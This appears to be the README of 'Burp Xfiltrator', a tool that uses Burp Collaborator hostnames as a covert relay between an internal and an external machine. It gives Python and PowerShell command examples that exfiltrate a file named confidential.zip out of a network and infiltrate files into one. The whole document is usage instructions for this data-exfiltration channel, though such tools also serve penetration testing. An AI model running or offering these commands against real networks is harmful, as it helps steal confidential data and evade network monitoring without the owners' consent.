# Burp Xfiltrator

## Usage

1. Open Burp Suite Professional.
2. Open Burp Collaborator Client tool.
3. Get two hostnames and two biids:
- &lt;BURPCOLLABORATOR-HOSTNAME-1&gt; and &lt;BIID-1&gt; for external to internal communication.
- &lt;BURPCOLLABORATOR-HOSTNAME-2&gt; and &lt;BIID-2&gt; for internal to external communication.

### For exfiltration

- Example 1:
```
(external computer) sh > python3 bx.py download <BURPCOLLABORATOR-HOSTNAME-1> <BIID-2> confidential.zip 1234qwer

(internal computer) PS > .\bx.ps1 upload <BURPCOLLABORATOR-HOSTNAME-2> <BIID-1> confidential.zip
Enter Key: 1234qwer
```
- Example 2:
```
(external computer) sh > python3 bx.py download <BURPCOLLABORATOR-HOSTNAME-1> <BIID-2> confidential.zip
Enter Key: 1234qwer

(internal computer) sh > python3 bx.py upload <BURPCOLLABORATOR-HOSTNAME-2> <BIID-1> confidential.zip 1234qwer
```

### For infiltration

- Example 1:
```
(internal computer) PS > .\bx.ps1 download <BURPCOLLABORATOR-HOSTNAME-2> <BIID-1> confidential.zip 1234qwer

(external computer) sh > python3 bx.py upload <BURPCOLLABORATOR-HOSTNAME-1> <BIID-2> confidential.zip 1234qwer
```
- Example 2:
```
(internal computer) PS > .\bx.ps1 download <BURPCOLLABORATOR-HOSTNAME-2> <BIID-1> confidential.zip
Enter Key: 1234qwer

(external computer) PS > .\bx.ps1 upload <BURPCOLLABORATOR-HOSTNAME-1> <BIID-2> confidential.zip 1234qwer
```
